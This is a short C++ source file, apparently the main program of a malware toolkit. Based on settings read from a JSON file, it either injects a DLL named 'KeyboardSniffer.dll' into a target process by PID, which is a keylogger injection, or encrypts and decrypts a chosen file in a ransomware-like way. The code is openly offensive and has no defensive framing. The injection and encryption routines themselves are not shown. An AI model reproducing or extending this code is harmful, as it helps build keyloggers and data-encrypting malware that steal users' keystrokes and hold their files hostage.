#include <iostream>
#include <json.hpp>
#include <fstream>
#include "Injector.h"
#include "Cryptographer.h"

using namespace std;
using json = nlohmann::json;

int main()
{
	ifstream file("param.json");//при сборке из визуалки указывать полный путь 

	char* writable = new char[0];
	json j;
	file >> j;

	string pathFile = j["pathProgramm"].get<string>();
	if (pathFile != "")
	{
		writable = new char[pathFile.size() + 1];
		copy(pathFile.begin(), pathFile.end(), writable);
		writable[pathFile.size()] = '\0';
	}

	

	switch (j["tpyeProgramm"].get<int>())
	{
		case 1:
			inject_DLL("KeyboardSniffer.dll", j["PID"].get<int>());
			break;
		case 2:
			switch (j["typeEncoderOperation"].get<int>())
			{
				case 1:
					EncryptionFile(writable);
					break;
				case 2:
					DecryptionFile(writable);
					break;
			}
			delete[] writable;
			break;
	}
}

